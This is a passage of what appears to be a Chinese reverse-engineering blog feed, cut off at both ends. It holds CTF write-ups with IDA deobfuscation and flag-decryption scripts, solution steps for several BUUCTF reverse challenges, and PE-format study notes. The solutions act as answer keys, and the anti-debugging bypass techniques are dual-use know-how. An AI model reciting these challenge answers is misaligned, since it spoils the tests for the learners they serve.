class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(other, SuperCFGNode):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.addr == other.addr</span><br></pre></td></tr></table></figure></li></ul></li><li><p>去混淆脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">st = <span class="number">0x0000000000400620</span> </span><br><span class="line">end = <span class="number">0x0000000000402144</span> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">next_instr</span>(<span class="params">addr</span>):</span><br><span class="line">    <span class="keyword">return</span> addr+idc.get_item_size(addr)<span class="comment">#获取指令或数据长度，这个函数的作用就是去往下一条指令</span></span><br><span class="line">    </span><br><span class="line">addr = st</span><br><span class="line"><span class="keyword">while</span>(addr&lt;end):</span><br><span class="line">    <span class="built_in">next</span> = next_instr(addr)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ds:dword_603054&quot;</span> <span class="keyword">in</span> GetDisasm(addr):<span class="comment">#GetDisasm(addr)得到addr的反汇编语句</span></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">            addr = <span class="built_in">next</span></span><br><span class="line">            <span class="built_in">next</span> = next_instr(addr)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;jnz&quot;</span> <span class="keyword">in</span> GetDisasm(addr):</span><br><span class="line">                dest = idc.get_operand_value(addr, <span class="number">0</span>)<span class="comment">#得到操作数，就是指令后的数</span></span><br><span class="line">                ida_bytes.patch_byte(addr, <span class="number">0xe9</span>)     <span class="comment">#0xe9 jmp后面的四个字节是偏移</span></span><br><span class="line">                ida_bytes.patch_byte(addr+<span class="number">5</span>, <span class="number">0x90</span>)   <span class="comment">#nop第五个字节</span></span><br><span class="line">                offset = dest - (addr + <span class="number">5</span>)  <span class="comment">#调整为正确的偏移地址 也就是相对偏移地址 - 当前指令后的地址</span></span><br><span class="line">                ida_bytes.patch_dword(addr + <span class="number">1</span>, offset) <span class="comment">#把地址赋值给jmp后</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;patch bcf: 0x%x&quot;</span>%addr)</span><br><span class="line">                addr = <span class="built_in">next</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        addr = <span class="built_in">next</span></span><br></pre></td></tr></table></figure></li><li><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">secret = [<span class="number">0xBC8FF26D43536296</span>, <span class="number">0x520100780530EE16</span>, <span class="number">0x4DC0B5EA935F08EC</span>,</span><br><span class="line">          <span class="number">0x342B90AFD853F450</span>, <span class="number">0x8B250EBCAA2C3681</span>, <span class="number">0x55759F81A2C68AE4</span>]</span><br><span class="line">key = <span class="number">0xB0004B7679FA26B3</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 产生CRC32查表法所用的表</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> secret:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        sign = s &amp; <span class="number">1</span>                   <span class="comment">#判断首位正负</span></span><br><span class="line">        <span class="keyword">if</span> sign == <span class="number">1</span>:</span><br><span class="line">            s ^= key</span><br><span class="line">        s //= <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> sign == <span class="number">1</span>:</span><br><span class="line">            s |= <span class="number">0x8000000000000000</span>    <span class="comment"># 防止负值除2，溢出为正值</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(s))                      <span class="comment"># 输出表</span></span><br><span class="line">    <span class="comment"># 计算CRC64</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> j &lt; <span class="number">8</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(s&amp;<span class="number">0xFF</span>)</span><br><span class="line">        s &gt;&gt;= <span class="number">8</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuctf-Re</title>
      <link href="/2023/03/31/Buuctf-RE/"/>
      <url>/2023/03/31/Buuctf-RE/</url>
      
        <content type="html"><![CDATA[<ul><li>Buuctf-Re<span id="more"></span></li></ul><HR color="red"></HR><h2 id="网鼎杯-2020-青龙组-jocker"><a href="#网鼎杯-2020-青龙组-jocker" class="headerlink" title="[网鼎杯 2020 青龙组]jocker"></a>[网鼎杯 2020 青龙组]jocker</h2><ol><li>exe文件，32位无壳，拖入IDA32</li><li>ctrl+f12定位主体函数，修改变量名提高可读性</li><li>F5反汇编发现提示栈错误，option调出栈指针，修改栈指针为0，重新F5</li><li>查看输入，24位字符串，主体：复制-&gt;加密-&gt;校对-&gt;encypt函数-&gt;final函数</li><li>发现wrong函数加密，omg函数校对，简单异或解密，提交错误，为障眼法（但是得到了正确的输入字符串）</li><li>wrong函数上方对输入的flag进行了复制，真正处理的是复制后的flag</li><li>找到相应的加密函数encypt，结果是动态加密函数，无法直接F5</li><li>exe拖入OD，找到调用加密函数地址，下断点，输入正确字符串运行</li><li>F7单步进入加密函数，ODdump脱壳，生成新文件</li><li>新文件拖入IDA，查看encypt函数，异或解密得到前19位flag</li><li>还剩最后5位，只剩final函数，未知加密，提示是隐藏，推断和之前加密方式相同，为异或加密</li><li>利用最后一位”}”推断出异或key，进行解密得到正确flag</li></ol><blockquote><p>核心：修改由于后续动态加密造成的栈指针错位，解密正确输入，OD动态加密脱壳</p></blockquote><h2 id="SWPU2019-EasiestRe"><a href="#SWPU2019-EasiestRe" class="headerlink" title="[SWPU2019]EasiestRe"></a>[SWPU2019]EasiestRe</h2><ol><li>拖入exeinfope，32位无壳，进IDA</li><li>ctrl+f找到main函数发现GetThreadContext、SetThreadContext等等函数，多线程没跑了，先放一边</li><li>ctrl+f12字符串查找flag找到主体函数(交叉引用)，修改变量名提高可读性</li><li>F5反编发现__debugbreak()，int3断点，可以准备改二进制了，继续查看还不止一个</li><li>重新看线程，是个父子线程保护，子线程加密，查看函数捕获重要长数组v16、v15</li><li>所以又是动态加密，返回__debugbreak()处tab看汇编，int3+nop的长度和v16对的上，那就把v16搬过去，改二进制，重新反编</li><li>观察主体函数：输入-&gt;加密-&gt;check-&gt;输出</li><li>进入加密，又有__debugbreak()，和上面一样的方式，用v15改二进制码，反编</li><li>进入check函数，tab查看汇编，408638地址处发现“cmp [ebp+var_20], 18h”校对指令</li><li>查看对应地址，找到校对字符串（即加密结果）</li><li>返回加密函数，分析，三次加密(异或–&gt;分段–&gt;移位)</li><li>逆写解密</li></ol><p>核心：双线程保护系统，int3断点(0xcc)，二进制修改</p><h2 id="WMCTF2020-easy-re"><a href="#WMCTF2020-easy-re" class="headerlink" title="[WMCTF2020]easy_re"></a>[WMCTF2020]easy_re</h2><ul><li>perl处理：一种解释语言，运行时解压，动调处理<ul><li>搜索script关键词，找到perl脚本调用处</li><li>再关键点下面设断点，F8运行到脚本执行完毕</li><li>下一个eax中可见原文</li></ul></li><li>b站：<a href="https://www.bilibili.com/video/BV1UP411F7b1/?spm_id_from=333.999.0.0&vd_source=5f9aee5168c95a4a7e003a6d12040095">WMCTF2020]easy_re_哔哩哔哩_bilibili</a></li></ul><h2 id="BJDCTF2020-hamburger-competition"><a href="#BJDCTF2020-hamburger-competition" class="headerlink" title="[BJDCTF2020]hamburger competition"></a>[BJDCTF2020]hamburger competition</h2><ul><li><p>一个unity游戏逆向问题</p></li><li><p>工具：dnspy</p></li><li><p>核心代码一般路径：</p><blockquote><p>\TPH\TPH_Data\Managed\Assembly-CSharp.dll</p></blockquote></li></ul><h2 id="INSHack2018-Tricky-Part1"><a href="#INSHack2018-Tricky-Part1" class="headerlink" title="[INSHack2018]Tricky-Part1"></a>[INSHack2018]Tricky-Part1</h2><ul><li>flag另外生成，可以直接动调，只要绕过创建子进程的反调试即可</li><li>直接nop调试函数</li><li>b站：</li></ul><h2 id="GWCTF-2019-babyvm"><a href="#GWCTF-2019-babyvm" class="headerlink" title="[GWCTF 2019]babyvm"></a>[GWCTF 2019]babyvm</h2><ul><li>vm题，主要还是找到题目提供的字节所对应的指令<ul><li>指令</li><li>操作地址</li><li>操作数</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">vminit</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *a1 = <span class="number">0</span>;</span><br><span class="line">  *(a1 + <span class="number">4</span>) = <span class="number">18</span>;</span><br><span class="line">  *(a1 + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">  *(a1 + <span class="number">12</span>) = <span class="number">0</span>;</span><br><span class="line">  *(a1 + <span class="number">16</span>) = &amp;unk_202060;                     <span class="comment">// operator</span></span><br><span class="line">  *(a1 + <span class="number">24</span>) = <span class="number">0xF1</span>;</span><br><span class="line">  *(a1 + <span class="number">32</span>) = mov;</span><br><span class="line">  *(a1 + <span class="number">40</span>) = <span class="number">0xF2</span>;</span><br><span class="line">  *(a1 + <span class="number">48</span>) = <span class="keyword">xor</span>;</span><br><span class="line">  *(a1 + <span class="number">56</span>) = <span class="number">0xF5</span>;</span><br><span class="line">  *(a1 + <span class="number">64</span>) = ReadToQword_2022A8;</span><br><span class="line">  *(a1 + <span class="number">72</span>) = <span class="number">0xF4</span>;</span><br><span class="line">  *(a1 + <span class="number">80</span>) = null;</span><br><span class="line">  *(a1 + <span class="number">88</span>) = <span class="number">0xF7</span>;</span><br><span class="line">  *(a1 + <span class="number">96</span>) = mul;</span><br><span class="line">  *(a1 + <span class="number">104</span>) = <span class="number">0xF8</span>;</span><br><span class="line">  *(a1 + <span class="number">112</span>) = swap;</span><br><span class="line">  *(a1 + <span class="number">120</span>) = <span class="number">0xF6</span>;</span><br><span class="line">  *(a1 + <span class="number">128</span>) = clac;</span><br><span class="line">  qword_2022A8 = <span class="built_in">malloc</span>(<span class="number">0x512</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(qword_2022A8, <span class="number">0</span>, <span class="number">0x512</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>找到对应关系后下一步就是还原unk_202060中的指令（尽可能自动化，不断的替换以及正则匹配等等）</p></li><li><p>提取数据</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> addr = <span class="number">0x202060</span>;</span><br><span class="line"><span class="keyword">auto</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n\n&#x27;</span>);</span><br><span class="line"><span class="keyword">for</span>(i; i &lt; (<span class="number">0x2022A0</span>-addr); i = i+<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Message</span>(<span class="string">&quot;0x%02x &quot;</span>,<span class="built_in">Byte</span>(addr+i));</span><br><span class="line"><span class="comment">//PatchByte(addr+i,Byte());</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>还原</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># re-1</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    x = f.read()</span><br><span class="line">x = x.replace(<span class="string">&#x27;0xf2&#x27;</span>,<span class="string">&#x27;\nXOR()&#x27;</span>)</span><br><span class="line">x = x.replace(<span class="string">&#x27;0xf5&#x27;</span>,<span class="string">&#x27;\nreadinput()\n&#x27;</span>)</span><br><span class="line">x = x.replace(<span class="string">&#x27;0xf8&#x27;</span>,<span class="string">&#x27;\nswap()&#x27;</span>)</span><br><span class="line">x = x.replace(<span class="string">&#x27;0xf6&#x27;</span>,<span class="string">&#x27;\nclac()\n&#x27;</span>)</span><br><span class="line">x = x.replace(<span class="string">&#x27;0xf7&#x27;</span>,<span class="string">&#x27;\nmul()\n&#x27;</span>)</span><br><span class="line">x = x.replace(<span class="string">&#x27;0xf1&#x27;</span>,<span class="string">&#x27;\n0xf1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># re-2</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;test1.txt&quot;</span>):</span><br><span class="line">    li = <span class="built_in">str</span>(line)</span><br><span class="line">    <span class="keyword">if</span> li.find(<span class="string">&#x27;0xf1&#x27;</span>) == -<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(line)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> li[<span class="number">5</span>:<span class="number">9</span>] == <span class="string">&#x27;0xe1&#x27;</span> <span class="keyword">or</span> li[<span class="number">5</span>:<span class="number">9</span>] == <span class="string">&#x27;0xe2&#x27;</span> <span class="keyword">or</span> li[<span class="number">5</span>:<span class="number">9</span>] == <span class="string">&#x27;0xe3&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;use flag&#x27;</span> + <span class="string">&#x27;[&#x27;</span> + li[<span class="number">10</span>:<span class="number">14</span>] + <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> li[<span class="number">5</span>:<span class="number">9</span>] == <span class="string">&#x27;0xe4&#x27;</span> <span class="keyword">or</span> li[<span class="number">5</span>:<span class="number">9</span>] == <span class="string">&#x27;0xe7&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;use resu&#x27;</span> + <span class="string">&#x27;[&#x27;</span> + li[<span class="number">10</span>:<span class="number">14</span>] + <span class="string">&#x27;]&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>线性计算z3 &amp; xor &amp; swap</li><li>b站：<a href="https://www.bilibili.com/video/BV1J24y1L7rU/?spm_id_from=333.999.list.card_archive.click">https://www.bilibili.com/video/BV1J24y1L7rU/?spm_id_from=333.999.list.card_archive.click</a></li></ul><h2 id="GKCTF-2021-app-debug"><a href="#GKCTF-2021-app-debug" class="headerlink" title="[GKCTF 2021]app-debug"></a>[GKCTF 2021]app-debug</h2><ul><li>SO层的一个修改key的tea加密</li></ul><h2 id="FlareOn1-5get-it"><a href="#FlareOn1-5get-it" class="headerlink" title="[FlareOn1]5get_it"></a>[FlareOn1]5get_it</h2><ul><li>DLL文件</li><li>找到关键点后对应返回值做一个排序即可</li></ul><h2 id="NPUCTF2020-芜湖🛫"><a href="#NPUCTF2020-芜湖🛫" class="headerlink" title="[NPUCTF2020]芜湖🛫"></a>[NPUCTF2020]芜湖🛫</h2><ul><li>base64隐写</li></ul>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Core Principles of Reverse Engineering --Note2</title>
      <link href="/2023/03/31/Note2/"/>
      <url>/2023/03/31/Note2/</url>
      
        <content type="html"><![CDATA[<ul><li>PE</li><li>DLL<span id="more"></span></li></ul><HR color="red"></HR><h1 id="PE文件格式"><a href="#PE文件格式" class="headerlink" title="PE文件格式"></a>PE文件格式</h1><h2 id="种类"><a href="#种类" class="headerlink" title="种类"></a>种类</h2><table><thead><tr><th>种类</th><th>主扩展名</th></tr></thead><tbody><tr><td>可执行系列</td><td>EXE，SCR</td></tr><tr><td>库系列</td><td>DLL，OCX，CPL，DRV</td></tr><tr><td>驱动程序系列</td><td>SYS，VXD</td></tr><tr><td>对象文件系列</td><td>OBJ</td></tr></tbody></table><h2 id="零碎点"><a href="#零碎点" class="headerlink" title="零碎点"></a>零碎点</h2><ol><li>PE文件分PE头与PE体</li><li>PE头由各种结构体构成，说明了文件大小、执行地址等等信息，PE体分多个节区，如代码段、数据段、资源段等。</li><li>PE文件在内存中和在磁盘中大小不同</li><li>RVA(相对虚拟地址) VA(虚拟内存绝对地址) RAW(文件偏移)</li></ol><h2 id="PE头分解"><a href="#PE头分解" class="headerlink" title="PE头分解"></a>PE头分解</h2><h3 id="DOS头"><a href="#DOS头" class="headerlink" title="DOS头"></a>DOS头</h3><p>核心参数：</p><ul><li>e_magic:DOS签名，“MZ”（DOS可执行文件设计者）</li><li>e_lfanew:指示NT头的偏移</li></ul><h3 id="DOS存根"><a href="#DOS存根" class="headerlink" title="DOS存根"></a>DOS存根</h3><p>一个可忽略项，可理解为DOS下执行的数据</p><blockquote><p>例如notepad.exe中的提示语:This program cannot be run in DOS mode</p></blockquote><h3 id="NT头"><a href="#NT头" class="headerlink" title="NT头"></a>NT头</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_NT_HEADERS &#123;</span><br><span class="line">    DWORD Signature;                             //签名“PE”</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;                //文件头</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;      //可选头</span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><h4 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_FILE_HEADER &#123;</span><br><span class="line">    WORD    Machine;                  //机器码（每种CPU都有各自的固定值，如intel x86的14C）</span><br><span class="line">    WORD    NumberOfSections;         //节区数量</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    DWORD   PointerToSymbolTable;</span><br><span class="line">    DWORD   NumberOfSymbols;</span><br><span class="line">    WORD    SizeOfOptionalHeader;     //指示可选头的大小</span><br><span class="line">    WORD    Characteristics;          //标识文件属性（是否为DLL等等）</span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER</span><br></pre></td></tr></table></figure><h4 id="可选头-直接把64位的搬过来了"><a href="#可选头-直接把64位的搬过来了" class="headerlink" title="可选头(直接把64位的搬过来了)"></a>可选头(直接把64位的搬过来了)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_OPTIONAL_HEADER64 &#123;</span><br><span class="line">    WORD        Magic;                       //32-10B， 64-20B</span><br><span class="line">    BYTE        MajorLinkerVersion;          </span><br><span class="line">    BYTE        MinorLinkerVersion;</span><br><span class="line">    DWORD       SizeOfCode;</span><br><span class="line">    DWORD       SizeOfInitializedData;</span><br><span class="line">    DWORD       SizeOfUninitializedData;</span><br><span class="line">    DWORD       AddressOfEntryPoint;         //PE的RVA值，指出代码起始位置</span><br><span class="line">    DWORD       BaseOfCode;</span><br><span class="line">    ULONGLONG   ImageBase;                   //基准，VA = RVA + ImageBase</span><br><span class="line">    DWORD       SectionAlignment;            //节区内存最小单位</span><br><span class="line">    DWORD       FileAlignment;               //节区磁盘最小单位</span><br><span class="line">    WORD        MajorOperatingSystemVersion;</span><br><span class="line">    WORD        MinorOperatingSystemVersion;</span><br><span class="line">    WORD        MajorImageVersion;</span><br><span class="line">    WORD        MinorImageVersion;</span><br><span class="line">    WORD        MajorSubsystemVersion;</span><br><span class="line">    WORD        MinorSubsystemVersion;</span><br><span class="line">    DWORD       Win32VersionValue;</span><br><span class="line">    DWORD       SizeOfImage;                 //指定在虚拟内存中所占空间大小</span><br><span class="line">    DWORD       SizeOfHeaders;               //PE头大小（第一节区所在位置与该值距文件开始偏移量相同）</span><br><span class="line">    DWORD       CheckSum;</span><br><span class="line">    WORD        Subsystem;                   //区分文件</span><br><span class="line">                                              1 Driver文件（系统驱动）</span><br><span class="line">                                              2 GUI文件（窗口应用程序）</span><br><span class="line">                                              3 CUI文件（控制台应用程序）</span><br><span class="line">    WORD        DllCharacteristics;</span><br><span class="line">    ULONGLONG   SizeOfStackReserve;</span><br><span class="line">    ULONGLONG   SizeOfStackCommit;</span><br><span class="line">    ULONGLONG   SizeOfHeapReserve;</span><br><span class="line">    ULONGLONG   SizeOfHeapCommit;</span><br><span class="line">    DWORD       LoaderFlags;</span><br><span class="line">    DWORD       NumberOfRvaAndSizes;         //</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;</span><br></pre></td></tr></table></figure><h3 id="节区头"><a href="#节区头" class="headerlink" title="节区头"></a>节区头</h3><h4 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h4><table><thead><tr><th>类别</th><th>访问权限</th></tr></thead><tbody><tr><td>code</td><td>执行，读取权限</td></tr><tr><td>data</td><td>非执行，读写权限</td></tr><tr><td>resource</td><td>非执行，读取权限</td></tr></tbody></table><h4 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#define IMAGE_SIZEOF_SHORT_NAME              8</span><br><span class="line"></span><br><span class="line">typedef struct _IMAGE_SECTION_HEADER &#123;</span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">    union &#123;</span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;            //内存中节区大小</span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;                 //内存中节区起始地址（RVA）</span><br><span class="line">    DWORD   SizeOfRawData;                  //磁盘中节区大小</span><br><span class="line">    DWORD   PointerToRawData;               //磁盘中节区起始地址</span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;                //节区属性</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><h2 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h2><ul><li>RAW &#x3D; RVA - (VA)VirtualAddress + PointerToRawData</li></ul><h1 id="DLL文件"><a href="#DLL文件" class="headerlink" title="DLL文件"></a>DLL文件</h1><ul><li>（Dynamic Link Library）动态链接库</li><li>目的：解决在多进程时一个系统API可能会被多次调用，多次加载到内存造成空间浪费的问题</li><li>描述：<ul><li>库封装，单独组成DLL文件</li><li>内存映射技术，实现多进程共享同一个文件</li><li>更新库时替换对应DLL文件</li></ul></li><li>加载方式：<ul><li>显式链接：使用时加载，用完后释放内存</li><li>隐式链接：加载程序时将DLL全部加载，程序终止后释放内存</li></ul></li></ul><h1 id="节区删除"><a href="#节区删除" class="headerlink" title="节区删除"></a>节区删除</h1><ol><li>删除节区头，PEview中查看节区头起始地址及长度，在hex编辑器中将该区域用0覆盖</li><li>删除节区，查看节区起始偏移及长度，hex编辑器中删除</li><li>修改IMAGE_FILE_HEADER[Number Of Sections -&#x3D; 1]</li><li>修改IMAGE_OPTIONAL_HEADER[Size Of Image减少对应长度]</li></ol><h1 id="附表："><a href="#附表：" class="headerlink" title="附表："></a>附表：</h1><h2 id="DataDirectory结构体数组-64-01239为重点"><a href="#DataDirectory结构体数组-64-01239为重点" class="headerlink" title="DataDirectory结构体数组(64)[01239为重点]"></a>DataDirectory结构体数组(64)[01239为重点]</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#define IMAGE_DIRECTORY_ENTRY_EXPORT          0   // Export Directory</span><br><span class="line">#define IMAGE_DIRECTORY_ENTRY_IMPORT          1   // Import Directory</span><br><span class="line">#define IMAGE_DIRECTORY_ENTRY_RESOURCE        2   // Resource Directory</span><br><span class="line">#define IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   // Exception Directory</span><br><span class="line">#define IMAGE_DIRECTORY_ENTRY_SECURITY        4   // Security Directory</span><br><span class="line">#define IMAGE_DIRECTORY_ENTRY_BASERELOC       5   // Base Relocation Table</span><br><span class="line">#define IMAGE_DIRECTORY_ENTRY_DEBUG           6   // Debug Directory</span><br><span class="line">        IMAGE_DIRECTORY_ENTRY_COPYRIGHT       7   // (X86 usage)</span><br><span class="line">#define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    7   // Architecture Specific Data</span><br><span class="line">#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR       8   // RVA of GP</span><br><span class="line">#define 